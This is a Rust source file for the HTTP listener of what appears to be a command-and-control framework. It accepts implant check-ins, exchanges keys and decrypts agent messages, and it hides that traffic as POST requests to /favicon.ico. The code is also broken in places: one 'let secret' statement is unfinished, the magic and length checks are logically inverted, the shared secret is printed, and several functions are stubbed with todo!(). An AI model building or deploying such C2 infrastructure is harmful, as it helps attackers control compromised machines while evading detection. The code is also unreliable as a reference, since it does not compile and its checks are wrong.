use actix_web::{App, HttpResponse, HttpServer, Responder, dev::ServerHandle, guard, web};
use application::{
    domain::model::listener_model::{ListenerId, ListenerModel, ListenerProtocol},
    outbound::{
        agent::{Agent, AgentId},
    },
};
use std::net::SocketAddr;
use std::time::Duration;
use tokio::{sync::{mpsc::{self, UnboundedSender}, oneshot}, task::JoinHandle};
use uuid::Uuid;

use crate::{c2_message::{C2Message, ListenerMessage}, listener::{listener::ListenerPort, packet::{CheckinCompleteResponse, CheckinResponse, Packet, Tlv::{self, CheckinCompleteRes, CheckinRes}}}};

pub struct HttpListener {
    pub id: Uuid,
    pub name: String,
    pub addr: SocketAddr,
    pub protocol: ListenerProtocol,
    pub handle: Option<ServerHandle>,
    pub server_task: Option<JoinHandle<anyhow::Result<()>>>,
    pub sender: mpsc::UnboundedSender<C2Message>,
}

impl Drop for HttpListener {
    fn drop(&mut self) {
        if let Some(handle) = self.handle.take() {
            tokio::spawn(handle.stop(true));
        }
    }
}

impl HttpListener {
    pub fn new(id: Uuid, name: String, addr: SocketAddr, protocol: ListenerProtocol, sender: mpsc::UnboundedSender<C2Message>) -> Self {
        Self {
            id,
            name,
            addr,
            protocol,
            handle: None,
            server_task: None,
            sender,
        }
    }

    pub fn spawn(&mut self) -> anyhow::Result<()> {
        let sender = self.sender.clone();
        let model = self.listener_model();
        let server = HttpServer::new(move || { 
            App::new()
                .app_data(web::Data::new(sender.clone()))
                .app_data(web::Data::new(model.clone()))
                .service(
                    web::resource("/favicon.ico").route(
                        web::route()
                            .guard(guard::Post())
                            .guard(guard::Header("Content-Type", "application/octet-stream"))
                            .to(dispatch)
                    )
                )
        })
            .workers(1)
            .bind(self.addr)?
            .shutdown_timeout(10)
            .disable_signals()
            .run();
        
        self.handle = Some(server.handle());
        self.server_task = Some(tokio::spawn(async move { server.await.map_err(anyhow::Error::from) }));
        Ok(())
    }

    pub async fn stop(&mut self) -> anyhow::Result<()> { 
        let handle = self.handle.take()
            .ok_or_else(|| anyhow::anyhow!("Listener not started"))?;

        let _ = tokio::spawn(tokio::time::timeout(Duration::from_secs(5), handle.stop(true))).await;
        Ok(())
    }
}

async fn dispatch(body: web::Bytes, sender: web::Data<UnboundedSender<C2Message>>, model: web::Data::<ListenerModel>) -> Result<impl Responder, actix_web::error::Error> {
    let mut packet = serde_cbor::from_slice::<Packet>(&body)
        .map_err(|_| actix_web::error::ErrorInternalServerError(""))?;
    
    if !packet.magic == 0xf3f3 {
        return Err(actix_web::error::ErrorBadRequest("invalid magic"));
    };

    if !packet.length == body[10..].len() as u64 {
        return Err(actix_web::error::ErrorBadRequest("invalid length"));
    };

    log::info!("{:?}", &packet);

    match packet.body {
        crate::listener::packet::Body::Plain(tlvs) => { 
            let res = handle_checkin(sender, tlvs, model).await; 
            let bytes = serde_cbor::to_vec(&res).unwrap();
            return Ok(HttpResponse::Ok().body(bytes))
        },
        crate::listener::packet::Body::Encrypted { nonce: _, cipher_text: _, tag: _ } => {
            let agent_id = uuid::Uuid::from_bytes(packet.agent_id);
            let (tx, rx) = oneshot::channel();
            
            let msg = C2Message::Listener(ListenerMessage::QuerySecret { listener_id: model.id, agent_id, reply: tx });
            let _ = sender.send(msg);
            let secret = rx.await
                .map_err(|e| actix_web::error::ErrorInternalServerError(e))?
                .map_err(|e| actix_web::error::ErrorInternalServerError(e))?;
            println!("shared secret: {:?}", secret);
            let plain = packet.decrypt(secret).unwrap(); // TODO
            let tlv = plain.first().unwrap();

            match tlv {
                Tlv::CheckinCompleteReq(checkin_complete_request) => {
                    log::info!("{}", checkin_complete_request.agent_info);
                },
                _ => (),
            }
            return Ok(HttpResponse::Ok().body("ok"))
        },
    }
}

async fn handle_checkin(sender: web::Data<UnboundedSender<C2Message>>, tlvs: Vec<Tlv>, model: web::Data::<ListenerModel>) -> Packet {
    log::info!("tlv length: {}", tlvs.len());
    match tlvs.first() {
        Some(tlv) => match tlv {
            Tlv::CheckinReq(checkin_request) => {
                let agent_id = Uuid::new_v4();
                let msg = C2Message::Listener(ListenerMessage::AgentCheckinReceived { 
                    listener_id: model.id,
                    agent_id,
                    agent_pubkey: checkin_request.agent_pubkey,
                });
                let _ = sender.send(msg);
                let (tx, rx) = oneshot::channel();
                let _ = sender.send(C2Message::Listener(ListenerMessage::Query { listener_id: model.id,  agent_id, reply: tx }));
                let secret 
                let res = vec![CheckinRes(CheckinResponse::new())];
                return Packet::new(res, agent_id);
            },
            Tlv::CheckinCompleteReq(checkin_complete_request) => {
                let agent_id = checkin_complete_request.agent_id.parse().unwrap(); // TODO unwrap
                let msg = C2Message::Listener(ListenerMessage::AgentCheckinCompleted { 
                    listener_id: model.id,
                    agent_id,
                });
                let _ = sender.send(msg);
                let res = vec![CheckinCompleteRes(CheckinCompleteResponse::new(model.id.to_string(), agent_id.to_string()))];
                return Packet::new(res, agent_id);
            },
            _ => todo!(),
        },
        None => todo!(),
    }

}


#[async_trait::async_trait]
impl ListenerPort for HttpListener {
    fn id(&self) -> ListenerId {
        self.id
    }
    fn name(&self) -> String {
        self.name.to_string()
    }
    fn addr(&self) -> SocketAddr {
        self.addr
    }
    fn protocol(&self) -> ListenerProtocol {
        self.protocol.clone()
    }
    fn listener_model(&self) -> ListenerModel {
        ListenerModel {
            id: self.id(),
            name: self.name(),
            addr: self.addr(),
            protocol: self.protocol(),
        }
    }

    fn start(&mut self) -> anyhow::Result<()> {
        self.spawn()
    }

    async fn stop(&mut self) -> anyhow::Result<()> {
        self.stop().await
    }

    fn list_agents(&self) -> Vec<Agent> {
        todo!()
    }

    fn add_agents(&mut self, agent: Agent) -> anyhow::Result<()> {
        todo!()
    }

    fn remove_agent(&mut self, agent_id: AgentId) -> anyhow::Result<()> {
        todo!()
    }

    fn remove_all_agent(&mut self) {
        todo!()
    }
}

